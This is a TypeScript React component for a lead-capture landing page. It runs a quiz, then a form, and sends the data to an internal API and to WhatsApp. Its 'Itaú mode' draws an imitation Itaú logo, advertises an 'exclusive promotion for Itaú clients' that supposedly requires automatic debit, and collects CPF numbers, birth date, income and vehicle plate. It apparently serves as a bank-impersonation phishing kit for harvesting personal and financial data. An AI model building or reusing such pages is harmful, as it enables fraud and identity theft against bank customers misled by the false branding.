"use client";

import { useMemo, useState } from "react";
import { trackEvent } from "@/components/TrackingBeacon";
import { SelectorButton } from "@/components/SelectorButton";
import {
  FORM_FIELD_LABELS,
  buildWhatsAppUrl,
  parsePageConfig,
  type FormFieldKey,
  type PageEngagementConfig,
} from "@/lib/page-config";

type Props = {
  pageId: string;
  domain: string;
  configRaw: unknown;
};

function getUtms() {
  if (typeof window === "undefined") return {};
  const p = new URLSearchParams(window.location.search);
  return {
    utm_source: p.get("utm_source") || undefined,
    utm_medium: p.get("utm_medium") || undefined,
    utm_campaign: p.get("utm_campaign") || undefined,
    utm_content: p.get("utm_content") || undefined,
    utm_term: p.get("utm_term") || undefined,
  };
}

/** retorna true se o visitante respondeu que tem veículo (para mostrar campo de placa) */
function answeredHasVehicle(answers: Record<string, string>): boolean {
  return Object.values(answers).some((v) =>
    v.toLowerCase().startsWith("sim")
  );
}

export function EngagementBlock({ pageId, domain, configRaw }: Props) {
  const config = useMemo(() => parsePageConfig(configRaw), [configRaw]);

  if (!config.showForm && !config.showQuiz) {
    return null;
  }

  return <EngagementFlow pageId={pageId} domain={domain} config={config} />;
}

function EngagementFlow({
  pageId,
  domain,
  config,
}: {
  pageId: string;
  domain: string;
  config: PageEngagementConfig;
}) {
  const baseEnabledFields = (Object.keys(config.formFields) as FormFieldKey[]).filter(
    (k) => config.formFields[k]
  );

  const [step, setStep] = useState<"quiz" | "form" | "done">(
    config.showQuiz ? "quiz" : "form"
  );
  const [quizIndex, setQuizIndex] = useState(0);
  const [answers, setAnswers] = useState<Record<string, string>>({});
  const [fields, setFields] = useState<Record<string, string>>({});
  const [error, setError] = useState("");
  const [saving, setSaving] = useState(false);
  const [whatsappOpened, setWhatsappOpened] = useState<boolean | null>(null);

  // Em modo Itaú: mostra placa somente se respondeu que TEM veículo
  const enabledFields: FormFieldKey[] = (() => {
    if (!config.itauMode) return baseEnabledFields;
    const hasVehicle = answeredHasVehicle(answers);
    return baseEnabledFields.filter((k) => {
      if (k === "placa") return hasVehicle;
      return true;
    });
  })();

  function pickQuiz(option: string) {
    const q = config.quizQuestions[quizIndex];
    if (!q) return;
    const nextAnswers = { ...answers, [q.question]: option };
    setAnswers(nextAnswers);

    if (quizIndex + 1 < config.quizQuestions.length) {
      setQuizIndex(quizIndex + 1);
      return;
    }

    if (config.showForm) {
      setStep("form");
      return;
    }

    void finish(nextAnswers, {});
  }

  async function finish(quizAnswers: Record<string, string>, formValues: Record<string, string>) {
    setSaving(true);
    setError("");

    let opened = false;
    if (config.sendToWhatsapp && config.whatsappNumber) {
      const extras: Record<string, string> = { ...formValues, ...quizAnswers };
      const url = buildWhatsAppUrl(config.whatsappNumber, config.whatsappMessage, extras);
      const win = window.open(url, "_blank", "noopener,noreferrer");
      opened = Boolean(win);
    }

    try {
      const res = await fetch("/api/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pageId,
          domain,
          form: formValues,
          quiz: quizAnswers,
          whatsappEnabled: config.sendToWhatsapp,
          whatsappOpened: opened,
          ...getUtms(),
        }),
        keepalive: true,
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.error || "Falha ao salvar lead");
      }

      trackEvent(pageId, domain, "lead", {
        quiz: quizAnswers,
        form: formValues,
        sendToWhatsapp: config.sendToWhatsapp,
        whatsappOpened: opened,
      });

      setWhatsappOpened(config.sendToWhatsapp ? opened : null);
      setStep("done");
    } catch (e) {
      setError(e instanceof Error ? e.message : "Erro ao enviar");
    } finally {
      setSaving(false);
    }
  }

  async function onSubmitForm(e: React.FormEvent) {
    e.preventDefault();
    setError("");

    for (const key of enabledFields) {
      if (!fields[key]?.trim()) {
        setError(`Preencha: ${FORM_FIELD_LABELS[key]}`);
        return;
      }
    }

    if (config.sendToWhatsapp && !config.whatsappNumber) {
      setError("WhatsApp não configurado nesta página.");
      return;
    }

    await finish(answers, fields);
  }

  if (step === "done") {
    if (!config.sendToWhatsapp) {
      return (
        <p className="lead-thanks">
          Dados salvos. Nossa equipe pode entrar em contato com você em breve.
        </p>
      );
    }

    return (
      <p className="lead-thanks">
        {whatsappOpened
          ? "Dados salvos e WhatsApp aberto com suas respostas."
          : "Dados salvos. Não conseguimos abrir o WhatsApp (pop-up bloqueado). Tente novamente ou fale conosco pelo número da página."}
      </p>
    );
  }

  if (step === "quiz") {
    const q = config.quizQuestions[quizIndex];
    if (!q) {
      return (
        <p className="muted">
          Quiz sem perguntas.{" "}
          {config.showForm ? "Continue no formulário abaixo." : null}
        </p>
      );
    }

    return (
      <div className="quiz-block">
        {config.itauMode && (
          <>
            <div className="itau-badge">
              <ItauLogoInline /> Promoção exclusiva para clientes Itaú
            </div>
            <p className="itau-helper-text">
              Para ativar a promoção, a validação deve ser feita com débito automático no Itaú.
            </p>
          </>
        )}
        <p className="quiz-progress">
          Pergunta {quizIndex + 1} de {config.quizQuestions.length}
        </p>
        <h3>{q.question}</h3>
        <div className="selector-row wrap quiz-options">
          {q.options.map((opt) => (
            <SelectorButton key={opt} label={opt} active={false} onClick={() => pickQuiz(opt)} />
          ))}
        </div>
      </div>
    );
  }

  if (!config.showForm) {
    return null;
  }

  const hasVehicle = config.itauMode ? answeredHasVehicle(answers) : true;

  return (
    <form className="lead-form" onSubmit={onSubmitForm}>
      {config.itauMode && (
        <>
          <div className="itau-badge">
            <ItauLogoInline /> Promoção exclusiva para clientes Itaú
          </div>
          <p className="itau-helper-text">
            Complete os dados para ativar a promoção. A validação final exige débito automático no Itaú.
          </p>
        </>
      )}
      <h3>{config.showQuiz ? "Quase lá — seus dados" : "Prefere que a gente te chame?"}</h3>
      {enabledFields.map((key) => (
        <label key={key}>
          {FORM_FIELD_LABELS[key]}
          {key === "placa" ? (
            <input
              value={fields[key] || ""}
              onChange={(e) =>
                setFields((prev) => ({
                  ...prev,
                  [key]: e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, 8),
                }))
              }
              placeholder="ABC1D23"
              maxLength={8}
              required
            />
          ) : key === "cpf" ? (
            <input
              value={fields[key] || ""}
              onChange={(e) =>
                setFields((prev) => ({
                  ...prev,
                  [key]: e.target.value.replace(/\D/g, "").slice(0, 11),
                }))
              }
              placeholder="00000000000"
              inputMode="numeric"
              required
            />
          ) : key === "birthDate" ? (
            <input
              value={fields[key] || ""}
              onChange={(e) => setFields((prev) => ({ ...prev, [key]: e.target.value }))}
              type="date"
              required
            />
          ) : key === "income" ? (
            <input
              value={fields[key] || ""}
              onChange={(e) =>
                setFields((prev) => ({
                  ...prev,
                  [key]: e.target.value.replace(/[^\d,.]/g, "").slice(0, 20),
                }))
              }
              placeholder="Ex: 3500"
              inputMode="decimal"
              required
            />
          ) : (
            <input
              value={fields[key] || ""}
              onChange={(e) => setFields((prev) => ({ ...prev, [key]: e.target.value }))}
              type={key === "email" ? "email" : "text"}
              required
            />
          )}
        </label>
      ))}
      {/* Modo Itaú: se não tem veículo, exibe checkbox "Não tenho veículo" */}
      {config.itauMode && !hasVehicle && (
        <p className="lead-no-vehicle">
          ✓ Registrado: sem veículo no nome
        </p>
      )}
      {error && <p className="form-error">{error}</p>}
      <button type="submit" disabled={saving}>
        {saving
          ? "Enviando..."
          : config.sendToWhatsapp
            ? "Enviar e abrir WhatsApp"
            : "Enviar dados para contato"}
      </button>
    </form>
  );
}

function ItauLogoInline() {
  return (
    <svg
      width="18"
      height="18"
      viewBox="0 0 40 40"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
      style={{ display: "inline", verticalAlign: "middle", marginRight: 4 }}
    >
      <circle cx="20" cy="20" r="20" fill="#EC7000" />
      <text
        x="20"
        y="26"
        textAnchor="middle"
        fill="#fff"
        fontSize="16"
        fontWeight="bold"
        fontFamily="Arial,sans-serif"
      >
        itaú
      </text>
    </svg>
  );
}
